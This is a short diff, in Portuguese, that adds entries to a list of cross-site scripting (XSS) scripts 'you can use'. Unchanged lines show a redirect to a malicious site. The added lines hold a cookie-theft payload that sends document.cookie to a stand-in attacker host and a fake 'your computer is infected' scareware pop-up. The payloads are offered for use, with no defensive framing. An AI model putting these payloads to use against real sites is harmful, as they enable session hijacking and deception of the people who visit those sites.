@@ -21,3 +21,13 @@ Aqui estão alguns exemplos de scripts XSS que você pode usar:
 <script>window.location.href = 'http://www.site-malicioso.com';</script>
 ```
 
+3. Script XSS para roubo de cookies:
+```html
+<script>document.location='http://www.site-do-atacante.com/cookie.php?cookie='+document.cookie;</script>
+```
+
+4. Script XSS para exibição de pop-up:
+```html
+<script>alert("Seu computador está infectado! Clique OK para remover o vírus.");</script>
+```
+
